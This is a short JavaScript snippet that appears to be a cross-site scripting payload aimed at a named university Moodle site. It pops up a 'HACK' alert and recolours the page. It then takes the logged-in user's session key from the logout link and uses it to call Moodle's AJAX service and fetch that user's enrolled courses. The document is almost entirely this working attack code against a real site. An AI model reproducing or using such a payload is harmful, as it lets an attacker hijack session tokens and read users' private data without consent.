alert("HACKKKKKKKK");
document.querySelector('body').style.background = "#232323";
const link = document.querySelector('a[href*="logout.php?sesskey="]');
const sesskey = link ? new URL(link.href).searchParams.get('sesskey') : null;

if (sesskey) {
  fetch(`https://moodle.arq.ifsp.edu.br/lib/ajax/service.php?sesskey=${sesskey}&info=core_course_get_enrolled_courses_by_timeline_classification`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify([{
      index: 0,
      methodname: 'core_course_get_enrolled_courses_by_timeline_classification',
      args: {
        classification: 'all',
        limit: 0,
        offset: 0,
        sort: 'fullname',
        customfieldname: '',
        customfieldvalue: ''
      }
    }])
  })
  .then(r => r.json())
  .then(console.log)
  .catch(console.error);
} else {
  console.error('Sesskey não encontrado');
}
